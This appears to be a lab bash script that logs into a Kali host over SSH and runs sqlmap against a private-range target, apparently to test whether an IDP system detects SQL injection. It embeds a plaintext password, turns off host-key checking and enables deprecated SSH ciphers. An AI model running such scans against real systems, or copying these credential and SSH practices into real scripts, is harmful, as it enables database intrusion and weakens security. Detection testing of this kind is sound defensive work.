#!/bin/bash
# SQL Injection attack from Kali using sqlmap
# Triggers: HTTP:SQL:* IDP signatures

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"

echo "=== SQL Injection Attack ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET})"
echo "Tool     : sqlmap"
echo "Triggers : HTTP:SQL:* IDP signatures"
echo ""
echo "Starting SQL injection probe..."
echo "(With IDP active, connections will be reset mid-attack)"
echo ""

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "sqlmap -u 'http://${TARGET}/items?id=1' \
     --level=2 --risk=2 \
     --technique=BEUST \
     --batch \
     --timeout=5 \
     --retries=0 \
     --output-dir=/tmp/sqlmap-out \
     2>&1 | grep -E 'testing|injection|error|connection|WARNING|CRITICAL|payload' | tail -20" 2>/dev/null

echo ""
echo "Attack complete. Check monitor-idp.sh for IDP hit counters."
